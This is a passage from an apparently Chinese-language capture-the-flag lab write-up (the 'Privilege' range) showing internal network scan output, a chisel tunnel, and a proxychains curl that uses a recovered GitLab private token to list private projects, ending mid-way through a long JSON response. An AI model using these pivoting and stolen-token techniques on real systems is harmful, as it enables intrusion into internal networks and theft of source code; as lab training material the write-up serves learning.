  code:403 len:548    title:None</span><br><span class="line">[*] WebTitle http://172.22.14.16:8060  code:404 len:555    title:404 Not Found</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.46</span><br><span class="line">   [-&gt;]XR-0923</span><br><span class="line">   [-&gt;]172.22.14.46</span><br><span class="line">[*] NetInfo</span><br><span class="line">[*]172.22.14.31</span><br><span class="line">   [-&gt;]XR-ORACLE</span><br><span class="line">   [-&gt;]172.22.14.31</span><br><span class="line">[*] NetBios 172.22.14.31    WORKGROUP\XR-ORACLE</span><br><span class="line">[*] NetBios 172.22.14.46    XIAORANG\XR-0923</span><br><span class="line">[*] NetBios 172.22.14.11    [+] DC:XIAORANG\XR-DC</span><br><span class="line">[*] WebTitle http://172.22.14.46       code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] WebTitle http://172.22.14.7        code:200 len:54603  title:XR SHOP</span><br><span class="line">[*] WebTitle http://172.22.14.16       code:302 len:99     title:None 跳转url: http://172.22.14.16/users/sign_in</span><br><span class="line">[*] WebTitle http://172.22.14.16/users/sign_in code:200 len:34961  title:Sign in · GitLab</span><br><span class="line">[+] PocScan http://172.22.14.7/www.zip poc-yaml-backup-file</span><br><span class="line">已完成 22/22</span><br><span class="line">[*] 扫描结束,耗时: 50.4186109s</span><br></pre></td></tr></table></figure><p>题目提示了gitlab，去找一下apitoken</p><figure><imgsrc="/images/春秋云境-Privilege/1754191605411-5a7bc29b-46b0-4fef-af90-2241a26e2ae4.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Privilege/1754191749268-a0da2272-da11-49ec-aead-21998eefdf78.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>回到jenkins解密一下</p><figure><imgsrc="/images/春秋云境-Privilege/1754191798561-f2ed7554-fd7d-484a-8f6f-a54ee18e2bee.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>chisel搭建一下隧道</p><figure><imgsrc="/images/春秋云境-Privilege/1754192081580-b6175cca-d50a-4ea6-9c56-86821a87486a.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><imgsrc="/images/春秋云境-Privilege/1754192093656-374e5dd8-54a9-40e3-b6a0-72bfcd2eb06b.png"alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>看一下gitlab上有哪些项目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(base) ┌──(root㉿WIN-EICAC432NIT)-[/home/starr]</span><br><span class="line">└─# proxychains4 curl --header &quot;PRIVATE-TOKEN:glpat-7kD_qLH2PiQv_ywB9hz2&quot; &quot;http://172.22.14.16/api/v4/projects&quot;</span><br><span class="line">[proxychains] config file found: /etc/proxychains4.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">[proxychains] Strict chain  ...  60.204.245.37:6000  ...  172.22.14.16:80  ...  OK</span><br><span class="line">[&#123;&quot;id&quot;:6,&quot;description&quot;:null,&quot;name&quot;:&quot;Internal Secret&quot;,&quot;name_with_namespace&quot;:&quot;XRLAB / Internal Secret&quot;,&quot;path&quot;:&quot;internal-secret&quot;,&quot;path_with_namespace&quot;:&quot;xrlab/internal-secret&quot;,&quot;created_at&quot;:&quot;2022-12-25T08:30:12.362Z&quot;,&quot;default_branch&quot;:&quot;main&quot;,&quot;tag_list&quot;:[],&quot;topics&quot;:[],&quot;ssh_url_to_repo&quot;:&quot;git@gitlab.xiaorang.lab:xrlab/internal-secret.git&quot;,&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/internal-secret.git&quot;,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/internal-secret&quot;,&quot;readme_url&quot;:null,&quot;avatar_url&quot;:null,&quot;forks_count&quot;:0,&quot;star_count&quot;:0,&quot;last_activity_at&quot;:&quot;2022-12-25T08:30:12.362Z&quot;,&quot;namespace&quot;:&#123;&quot;id&quot;:8,&quot;name&quot;:&quot;XRLAB&quot;,&quot;path&quot;:&quot;xrlab&quot;,&quot;kind&quot;:&quot;group&quot;,&quot;full_path&quot;:&quot;xrlab&quot;,&quot;parent_id&quot;:null,&quot;avatar_url&quot;:null,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;&#125;,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6&quot;,&quot;issues&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/issues&quot;,&quot;merge_requests&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/merge_requests&quot;,&quot;repo_branches&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/repository/branches&quot;,&quot;labels&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/labels&quot;,&quot;events&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/events&quot;,&quot;members&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/members&quot;,&quot;cluster_agents&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/6/cluster_agents&quot;&#125;,&quot;packages_enabled&quot;:true,&quot;empty_repo&quot;:false,&quot;archived&quot;:false,&quot;visibility&quot;:&quot;private&quot;,&quot;resolve_outdated_diff_discussions&quot;:false,&quot;container_expiration_policy&quot;:&#123;&quot;cadence&quot;:&quot;1d&quot;,&quot;enabled&quot;:false,&quot;keep_n&quot;:10,&quot;older_than&quot;:&quot;90d&quot;,&quot;name_regex&quot;:&quot;.*&quot;,&quot;name_regex_keep&quot;:null,&quot;next_run_at&quot;:&quot;2022-12-26T08:30:12.373Z&quot;&#125;,&quot;issues_enabled&quot;:true,&quot;merge_requests_enabled&quot;:true,&quot;wiki_enabled&quot;:true,&quot;jobs_enabled&quot;:true,&quot;snippets_enabled&quot;:true,&quot;container_registry_enabled&quot;:true,&quot;service_desk_enabled&quot;:false,&quot;service_desk_address&quot;:null,&quot;can_create_merge_request_in&quot;:true,&quot;issues_access_level&quot;:&quot;enabled&quot;,&quot;repository_access_level&quot;:&quot;enabled&quot;,&quot;merge_requests_access_level&quot;:&quot;enabled&quot;,&quot;forking_access_level&quot;:&quot;enabled&quot;,&quot;wiki_access_level&quot;:&quot;enabled&quot;,&quot;builds_access_level&quot;:&quot;enabled&quot;,&quot;snippets_access_level&quot;:&quot;enabled&quot;,&quot;pages_access_level&quot;:&quot;private&quot;,&quot;operations_access_level&quot;:&quot;enabled&quot;,&quot;analytics_access_level&quot;:&quot;enabled&quot;,&quot;container_registry_access_level&quot;:&quot;enabled&quot;,&quot;security_and_compliance_access_level&quot;:&quot;private&quot;,&quot;releases_access_level&quot;:&quot;enabled&quot;,&quot;environments_access_level&quot;:&quot;enabled&quot;,&quot;feature_flags_access_level&quot;:&quot;enabled&quot;,&quot;infrastructure_access_level&quot;:&quot;enabled&quot;,&quot;monitor_access_level&quot;:&quot;enabled&quot;,&quot;emails_disabled&quot;:null,&quot;shared_runners_enabled&quot;:true,&quot;lfs_enabled&quot;:true,&quot;creator_id&quot;:2,&quot;import_url&quot;:null,&quot;import_type&quot;:null,&quot;import_status&quot;:&quot;none&quot;,&quot;open_issues_count&quot;:0,&quot;ci_default_git_depth&quot;:20,&quot;ci_forward_deployment_enabled&quot;:true,&quot;ci_job_token_scope_enabled&quot;:false,&quot;ci_separated_caches&quot;:true,&quot;ci_opt_in_jwt&quot;:false,&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;:true,&quot;public_jobs&quot;:true,&quot;build_timeout&quot;:3600,&quot;auto_cancel_pending_pipelines&quot;:&quot;enabled&quot;,&quot;ci_config_path&quot;:null,&quot;shared_with_groups&quot;:[],&quot;only_allow_merge_if_pipeline_succeeds&quot;:false,&quot;allow_merge_on_skipped_pipeline&quot;:null,&quot;restrict_user_defined_variables&quot;:false,&quot;request_access_enabled&quot;:true,&quot;only_allow_merge_if_all_discussions_are_resolved&quot;:false,&quot;remove_source_branch_after_merge&quot;:true,&quot;printing_merge_request_link_enabled&quot;:true,&quot;merge_method&quot;:&quot;merge&quot;,&quot;squash_option&quot;:&quot;default_off&quot;,&quot;enforce_auth_checks_on_uploads&quot;:true,&quot;suggestion_commit_message&quot;:null,&quot;merge_commit_template&quot;:null,&quot;squash_commit_template&quot;:null,&quot;issue_branch_template&quot;:null,&quot;auto_devops_enabled&quot;:true,&quot;auto_devops_deploy_strategy&quot;:&quot;continuous&quot;,&quot;autoclose_referenced_issues&quot;:true,&quot;keep_latest_artifact&quot;:true,&quot;runner_token_expiration_interval&quot;:null,&quot;permissions&quot;:&#123;&quot;project_access&quot;:null,&quot;group_access&quot;:&#123;&quot;access_level&quot;:50,&quot;notification_level&quot;:3&#125;&#125;&#125;,&#123;&quot;id&quot;:4,&quot;description&quot;:null,&quot;name&quot;:&quot;XRAdmin&quot;,&quot;name_with_namespace&quot;:&quot;XRLAB / XRAdmin&quot;,&quot;path&quot;:&quot;xradmin&quot;,&quot;path_with_namespace&quot;:&quot;xrlab/xradmin&quot;,&quot;created_at&quot;:&quot;2022-12-25T07:48:16.751Z&quot;,&quot;default_branch&quot;:&quot;main&quot;,&quot;tag_list&quot;:[],&quot;topics&quot;:[],&quot;ssh_url_to_repo&quot;:&quot;git@gitlab.xiaorang.lab:xrlab/xradmin.git&quot;,&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xradmin.git&quot;,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xradmin&quot;,&quot;readme_url&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xradmin/-/blob/main/README.md&quot;,&quot;avatar_url&quot;:null,&quot;forks_count&quot;:0,&quot;star_count&quot;:0,&quot;last_activity_at&quot;:&quot;2023-05-30T10:27:31.762Z&quot;,&quot;namespace&quot;:&#123;&quot;id&quot;:8,&quot;name&quot;:&quot;XRLAB&quot;,&quot;path&quot;:&quot;xrlab&quot;,&quot;kind&quot;:&quot;group&quot;,&quot;full_path&quot;:&quot;xrlab&quot;,&quot;parent_id&quot;:null,&quot;avatar_url&quot;:null,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;&#125;,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4&quot;,&quot;issues&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/issues&quot;,&quot;merge_requests&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/merge_requests&quot;,&quot;repo_branches&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/repository/branches&quot;,&quot;labels&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/labels&quot;,&quot;events&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/events&quot;,&quot;members&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/members&quot;,&quot;cluster_agents&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/4/cluster_agents&quot;&#125;,&quot;packages_enabled&quot;:true,&quot;empty_repo&quot;:false,&quot;archived&quot;:false,&quot;visibility&quot;:&quot;private&quot;,&quot;resolve_outdated_diff_discussions&quot;:false,&quot;container_expiration_policy&quot;:&#123;&quot;cadence&quot;:&quot;1d&quot;,&quot;enabled&quot;:false,&quot;keep_n&quot;:10,&quot;older_than&quot;:&quot;90d&quot;,&quot;name_regex&quot;:&quot;.*&quot;,&quot;name_regex_keep&quot;:null,&quot;next_run_at&quot;:&quot;2022-12-26T07:48:16.788Z&quot;&#125;,&quot;issues_enabled&quot;:true,&quot;merge_requests_enabled&quot;:true,&quot;wiki_enabled&quot;:true,&quot;jobs_enabled&quot;:true,&quot;snippets_enabled&quot;:true,&quot;container_registry_enabled&quot;:true,&quot;service_desk_enabled&quot;:false,&quot;service_desk_address&quot;:null,&quot;can_create_merge_request_in&quot;:true,&quot;issues_access_level&quot;:&quot;enabled&quot;,&quot;repository_access_level&quot;:&quot;enabled&quot;,&quot;merge_requests_access_level&quot;:&quot;enabled&quot;,&quot;forking_access_level&quot;:&quot;enabled&quot;,&quot;wiki_access_level&quot;:&quot;enabled&quot;,&quot;builds_access_level&quot;:&quot;enabled&quot;,&quot;snippets_access_level&quot;:&quot;enabled&quot;,&quot;pages_access_level&quot;:&quot;private&quot;,&quot;operations_access_level&quot;:&quot;enabled&quot;,&quot;analytics_access_level&quot;:&quot;enabled&quot;,&quot;container_registry_access_level&quot;:&quot;enabled&quot;,&quot;security_and_compliance_access_level&quot;:&quot;private&quot;,&quot;releases_access_level&quot;:&quot;enabled&quot;,&quot;environments_access_level&quot;:&quot;enabled&quot;,&quot;feature_flags_access_level&quot;:&quot;enabled&quot;,&quot;infrastructure_access_level&quot;:&quot;enabled&quot;,&quot;monitor_access_level&quot;:&quot;enabled&quot;,&quot;emails_disabled&quot;:null,&quot;shared_runners_enabled&quot;:true,&quot;lfs_enabled&quot;:true,&quot;creator_id&quot;:2,&quot;import_url&quot;:null,&quot;import_type&quot;:null,&quot;import_status&quot;:&quot;none&quot;,&quot;open_issues_count&quot;:0,&quot;ci_default_git_depth&quot;:20,&quot;ci_forward_deployment_enabled&quot;:true,&quot;ci_job_token_scope_enabled&quot;:false,&quot;ci_separated_caches&quot;:true,&quot;ci_opt_in_jwt&quot;:false,&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;:true,&quot;public_jobs&quot;:true,&quot;build_timeout&quot;:3600,&quot;auto_cancel_pending_pipelines&quot;:&quot;enabled&quot;,&quot;ci_config_path&quot;:null,&quot;shared_with_groups&quot;:[],&quot;only_allow_merge_if_pipeline_succeeds&quot;:false,&quot;allow_merge_on_skipped_pipeline&quot;:null,&quot;restrict_user_defined_variables&quot;:false,&quot;request_access_enabled&quot;:true,&quot;only_allow_merge_if_all_discussions_are_resolved&quot;:false,&quot;remove_source_branch_after_merge&quot;:true,&quot;printing_merge_request_link_enabled&quot;:true,&quot;merge_method&quot;:&quot;merge&quot;,&quot;squash_option&quot;:&quot;default_off&quot;,&quot;enforce_auth_checks_on_uploads&quot;:true,&quot;suggestion_commit_message&quot;:null,&quot;merge_commit_template&quot;:null,&quot;squash_commit_template&quot;:null,&quot;issue_branch_template&quot;:null,&quot;auto_devops_enabled&quot;:false,&quot;auto_devops_deploy_strategy&quot;:&quot;continuous&quot;,&quot;autoclose_referenced_issues&quot;:true,&quot;keep_latest_artifact&quot;:true,&quot;runner_token_expiration_interval&quot;:null,&quot;permissions&quot;:&#123;&quot;project_access&quot;:null,&quot;group_access&quot;:&#123;&quot;access_level&quot;:50,&quot;notification_level&quot;:3&#125;&#125;&#125;,&#123;&quot;id&quot;:3,&quot;description&quot;:null,&quot;name&quot;:&quot;Awenode&quot;,&quot;name_with_namespace&quot;:&quot;XRLAB / Awenode&quot;,&quot;path&quot;:&quot;awenode&quot;,&quot;path_with_namespace&quot;:&quot;xrlab/awenode&quot;,&quot;created_at&quot;:&quot;2022-12-25T07:46:43.635Z&quot;,&quot;default_branch&quot;:&quot;master&quot;,&quot;tag_list&quot;:[],&quot;topics&quot;:[],&quot;ssh_url_to_repo&quot;:&quot;git@gitlab.xiaorang.lab:xrlab/awenode.git&quot;,&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/awenode.git&quot;,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/awenode&quot;,&quot;readme_url&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/awenode/-/blob/master/README.md&quot;,&quot;avatar_url&quot;:null,&quot;forks_count&quot;:0,&quot;star_count&quot;:0,&quot;last_activity_at&quot;:&quot;2022-12-25T07:46:43.635Z&quot;,&quot;namespace&quot;:&#123;&quot;id&quot;:8,&quot;name&quot;:&quot;XRLAB&quot;,&quot;path&quot;:&quot;xrlab&quot;,&quot;kind&quot;:&quot;group&quot;,&quot;full_path&quot;:&quot;xrlab&quot;,&quot;parent_id&quot;:null,&quot;avatar_url&quot;:null,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;&#125;,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3&quot;,&quot;issues&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/issues&quot;,&quot;merge_requests&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/merge_requests&quot;,&quot;repo_branches&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/repository/branches&quot;,&quot;labels&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/labels&quot;,&quot;events&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/events&quot;,&quot;members&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/members&quot;,&quot;cluster_agents&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/3/cluster_agents&quot;&#125;,&quot;packages_enabled&quot;:true,&quot;empty_repo&quot;:false,&quot;archived&quot;:false,&quot;visibility&quot;:&quot;private&quot;,&quot;resolve_outdated_diff_discussions&quot;:false,&quot;container_expiration_policy&quot;:&#123;&quot;cadence&quot;:&quot;1d&quot;,&quot;enabled&quot;:false,&quot;keep_n&quot;:10,&quot;older_than&quot;:&quot;90d&quot;,&quot;name_regex&quot;:&quot;.*&quot;,&quot;name_regex_keep&quot;:null,&quot;next_run_at&quot;:&quot;2022-12-26T07:46:44.614Z&quot;&#125;,&quot;issues_enabled&quot;:true,&quot;merge_requests_enabled&quot;:true,&quot;wiki_enabled&quot;:true,&quot;jobs_enabled&quot;:true,&quot;snippets_enabled&quot;:true,&quot;container_registry_enabled&quot;:true,&quot;service_desk_enabled&quot;:false,&quot;service_desk_address&quot;:null,&quot;can_create_merge_request_in&quot;:true,&quot;issues_access_level&quot;:&quot;enabled&quot;,&quot;repository_access_level&quot;:&quot;enabled&quot;,&quot;merge_requests_access_level&quot;:&quot;enabled&quot;,&quot;forking_access_level&quot;:&quot;enabled&quot;,&quot;wiki_access_level&quot;:&quot;enabled&quot;,&quot;builds_access_level&quot;:&quot;enabled&quot;,&quot;snippets_access_level&quot;:&quot;enabled&quot;,&quot;pages_access_level&quot;:&quot;private&quot;,&quot;operations_access_level&quot;:&quot;enabled&quot;,&quot;analytics_access_level&quot;:&quot;enabled&quot;,&quot;container_registry_access_level&quot;:&quot;enabled&quot;,&quot;security_and_compliance_access_level&quot;:&quot;private&quot;,&quot;releases_access_level&quot;:&quot;enabled&quot;,&quot;environments_access_level&quot;:&quot;enabled&quot;,&quot;feature_flags_access_level&quot;:&quot;enabled&quot;,&quot;infrastructure_access_level&quot;:&quot;enabled&quot;,&quot;monitor_access_level&quot;:&quot;enabled&quot;,&quot;emails_disabled&quot;:null,&quot;shared_runners_enabled&quot;:true,&quot;lfs_enabled&quot;:true,&quot;creator_id&quot;:2,&quot;import_url&quot;:null,&quot;import_type&quot;:&quot;gitlab_project&quot;,&quot;import_status&quot;:&quot;finished&quot;,&quot;open_issues_count&quot;:0,&quot;ci_default_git_depth&quot;:20,&quot;ci_forward_deployment_enabled&quot;:true,&quot;ci_job_token_scope_enabled&quot;:false,&quot;ci_separated_caches&quot;:true,&quot;ci_opt_in_jwt&quot;:false,&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;:true,&quot;public_jobs&quot;:true,&quot;build_timeout&quot;:3600,&quot;auto_cancel_pending_pipelines&quot;:&quot;enabled&quot;,&quot;ci_config_path&quot;:null,&quot;shared_with_groups&quot;:[],&quot;only_allow_merge_if_pipeline_succeeds&quot;:false,&quot;allow_merge_on_skipped_pipeline&quot;:null,&quot;restrict_user_defined_variables&quot;:false,&quot;request_access_enabled&quot;:true,&quot;only_allow_merge_if_all_discussions_are_resolved&quot;:false,&quot;remove_source_branch_after_merge&quot;:true,&quot;printing_merge_request_link_enabled&quot;:true,&quot;merge_method&quot;:&quot;merge&quot;,&quot;squash_option&quot;:&quot;default_off&quot;,&quot;enforce_auth_checks_on_uploads&quot;:true,&quot;suggestion_commit_message&quot;:null,&quot;merge_commit_template&quot;:null,&quot;squash_commit_template&quot;:null,&quot;issue_branch_template&quot;:null,&quot;auto_devops_enabled&quot;:true,&quot;auto_devops_deploy_strategy&quot;:&quot;continuous&quot;,&quot;autoclose_referenced_issues&quot;:true,&quot;keep_latest_artifact&quot;:true,&quot;runner_token_expiration_interval&quot;:null,&quot;permissions&quot;:&#123;&quot;project_access&quot;:&#123;&quot;access_level&quot;:40,&quot;notification_level&quot;:null&#125;,&quot;group_access&quot;:&#123;&quot;access_level&quot;:50,&quot;notification_level&quot;:3&#125;&#125;&#125;,&#123;&quot;id&quot;:2,&quot;description&quot;:&quot;Example GitBook site using GitLab Pages: https://pages.gitlab.io/gitbook&quot;,&quot;name&quot;:&quot;XRWiki&quot;,&quot;name_with_namespace&quot;:&quot;XRLAB / XRWiki&quot;,&quot;path&quot;:&quot;xrwiki&quot;,&quot;path_with_namespace&quot;:&quot;xrlab/xrwiki&quot;,&quot;created_at&quot;:&quot;2022-12-25T07:44:18.589Z&quot;,&quot;default_branch&quot;:&quot;master&quot;,&quot;tag_list&quot;:[],&quot;topics&quot;:[],&quot;ssh_url_to_repo&quot;:&quot;git@gitlab.xiaorang.lab:xrlab/xrwiki.git&quot;,&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xrwiki.git&quot;,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xrwiki&quot;,&quot;readme_url&quot;:&quot;http://gitlab.xiaorang.lab/xrlab/xrwiki/-/blob/master/README.md&quot;,&quot;avatar_url&quot;:&quot;http://gitlab.xiaorang.lab/uploads/-/system/project/avatar/2/gitbook.png&quot;,&quot;forks_count&quot;:0,&quot;star_count&quot;:0,&quot;last_activity_at&quot;:&quot;2022-12-25T07:44:18.589Z&quot;,&quot;namespace&quot;:&#123;&quot;id&quot;:8,&quot;name&quot;:&quot;XRLAB&quot;,&quot;path&quot;:&quot;xrlab&quot;,&quot;kind&quot;:&quot;group&quot;,&quot;full_path&quot;:&quot;xrlab&quot;,&quot;parent_id&quot;:null,&quot;avatar_url&quot;:null,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/groups/xrlab&quot;&#125;,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2&quot;,&quot;issues&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/issues&quot;,&quot;merge_requests&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/merge_requests&quot;,&quot;repo_branches&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/repository/branches&quot;,&quot;labels&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/labels&quot;,&quot;events&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/events&quot;,&quot;members&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/members&quot;,&quot;cluster_agents&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/2/cluster_agents&quot;&#125;,&quot;packages_enabled&quot;:true,&quot;empty_repo&quot;:false,&quot;archived&quot;:false,&quot;visibility&quot;:&quot;private&quot;,&quot;resolve_outdated_diff_discussions&quot;:null,&quot;container_expiration_policy&quot;:&#123;&quot;cadence&quot;:&quot;1d&quot;,&quot;enabled&quot;:false,&quot;keep_n&quot;:10,&quot;older_than&quot;:&quot;90d&quot;,&quot;name_regex&quot;:&quot;.*&quot;,&quot;name_regex_keep&quot;:null,&quot;next_run_at&quot;:&quot;2022-12-26T07:44:18.627Z&quot;&#125;,&quot;issues_enabled&quot;:true,&quot;merge_requests_enabled&quot;:true,&quot;wiki_enabled&quot;:false,&quot;jobs_enabled&quot;:true,&quot;snippets_enabled&quot;:false,&quot;container_registry_enabled&quot;:false,&quot;service_desk_enabled&quot;:false,&quot;service_desk_address&quot;:null,&quot;can_create_merge_request_in&quot;:true,&quot;issues_access_level&quot;:&quot;enabled&quot;,&quot;repository_access_level&quot;:&quot;enabled&quot;,&quot;merge_requests_access_level&quot;:&quot;enabled&quot;,&quot;forking_access_level&quot;:&quot;enabled&quot;,&quot;wiki_access_level&quot;:&quot;disabled&quot;,&quot;builds_access_level&quot;:&quot;enabled&quot;,&quot;snippets_access_level&quot;:&quot;disabled&quot;,&quot;pages_access_level&quot;:&quot;public&quot;,&quot;operations_access_level&quot;:&quot;enabled&quot;,&quot;analytics_access_level&quot;:&quot;enabled&quot;,&quot;container_registry_access_level&quot;:&quot;disabled&quot;,&quot;security_and_compliance_access_level&quot;:&quot;private&quot;,&quot;releases_access_level&quot;:&quot;enabled&quot;,&quot;environments_access_level&quot;:&quot;enabled&quot;,&quot;feature_flags_access_level&quot;:&quot;enabled&quot;,&quot;infrastructure_access_level&quot;:&quot;enabled&quot;,&quot;monitor_access_level&quot;:&quot;enabled&quot;,&quot;emails_disabled&quot;:null,&quot;shared_runners_enabled&quot;:true,&quot;lfs_enabled&quot;:true,&quot;creator_id&quot;:2,&quot;import_url&quot;:null,&quot;import_type&quot;:&quot;gitlab_project&quot;,&quot;import_status&quot;:&quot;finished&quot;,&quot;open_issues_count&quot;:0,&quot;ci_default_git_depth&quot;:20,&quot;ci_forward_deployment_enabled&quot;:true,&quot;ci_job_token_scope_enabled&quot;:false,&quot;ci_separated_caches&quot;:true,&quot;ci_opt_in_jwt&quot;:false,&quot;ci_allow_fork_pipelines_to_run_in_parent_project&quot;:true,&quot;public_jobs&quot;:true,&quot;build_timeout&quot;:3600,&quot;auto_cancel_pending_pipelines&quot;:&quot;enabled&quot;,&quot;ci_config_path&quot;:null,&quot;shared_with_groups&quot;:[],&quot;only_allow_merge_if_pipeline_succeeds&quot;:false,&quot;allow_merge_on_skipped_pipeline&quot;:null,&quot;restrict_user_defined_variables&quot;:false,&quot;request_access_enabled&quot;:false,&quot;only_allow_merge_if_all_discussions_are_resolved&quot;:false,&quot;remove_source_branch_after_merge&quot;:true,&quot;printing_merge_request_link_enabled&quot;:true,&quot;merge_method&quot;:&quot;merge&quot;,&quot;squash_option&quot;:&quot;default_off&quot;,&quot;enforce_auth_checks_on_uploads&quot;:true,&quot;suggestion_commit_message&quot;:null,&quot;merge_commit_template&quot;:null,&quot;squash_commit_template&quot;:null,&quot;issue_branch_template&quot;:null,&quot;auto_devops_enabled&quot;:true,&quot;auto_devops_deploy_strategy&quot;:&quot;continuous&quot;,&quot;autoclose_referenced_issues&quot;:true,&quot;keep_latest_artifact&quot;:true,&quot;runner_token_expiration_interval&quot;:null,&quot;permissions&quot;:&#123;&quot;project_access&quot;:&#123;&quot;access_level&quot;:40,&quot;notification_level&quot;:null&#125;,&quot;group_access&quot;:&#123;&quot;access_level&quot;:50,&quot;notification_level&quot;:3&#125;&#125;&#125;,&#123;&quot;id&quot;:1,&quot;description&quot;:&quot;This project is automatically generated and helps monitor this GitLab instance. [Learn more](/help/administration/monitoring/gitlab_self_monitoring_project/index).&quot;,&quot;name&quot;:&quot;Monitoring&quot;,&quot;name_with_namespace&quot;:&quot;GitLab Instance / Monitoring&quot;,&quot;path&quot;:&quot;Monitoring&quot;,&quot;path_with_namespace&quot;:&quot;gitlab-instance-23352f48/Monitoring&quot;,&quot;created_at&quot;:&quot;2022-12-25T07:18:20.914Z&quot;,&quot;default_branch&quot;:&quot;main&quot;,&quot;tag_list&quot;:[],&quot;topics&quot;:[],&quot;ssh_url_to_repo&quot;:&quot;git@gitlab.xiaorang.lab:gitlab-instance-23352f48/Monitoring.git&quot;,&quot;http_url_to_repo&quot;:&quot;http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring.git&quot;,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/gitlab-instance-23352f48/Monitoring&quot;,&quot;readme_url&quot;:null,&quot;avatar_url&quot;:null,&quot;forks_count&quot;:0,&quot;star_count&quot;:0,&quot;last_activity_at&quot;:&quot;2022-12-25T07:18:20.914Z&quot;,&quot;namespace&quot;:&#123;&quot;id&quot;:2,&quot;name&quot;:&quot;GitLab Instance&quot;,&quot;path&quot;:&quot;gitlab-instance-23352f48&quot;,&quot;kind&quot;:&quot;group&quot;,&quot;full_path&quot;:&quot;gitlab-instance-23352f48&quot;,&quot;parent_id&quot;:null,&quot;avatar_url&quot;:null,&quot;web_url&quot;:&quot;http://gitlab.xiaorang.lab/groups/gitlab-instance-23352f48&quot;&#125;,&quot;_links&quot;:&#123;&quot;self&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1&quot;,&quot;issues&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/issues&quot;,&quot;merge_requests&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/merge_requests&quot;,&quot;repo_branches&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/repository/branches&quot;,&quot;labels&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/labels&quot;,&quot;events&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/events&quot;,&quot;members&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/members&quot;,&quot;cluster_agents&quot;:&quot;http://gitlab.xiaorang.lab/api/v4/projects/1/cluster_agents&quot;&#125;,&quot;packages_enabled&quot;:true,&quot;empty_repo&quot;:true,&quot;archived&quot;:false,&quot;visibility&quot;:&quot;internal&quot;,&quot;resolve_outdated_diff_discussions&quot;:false,&quot;container_expiration_policy&q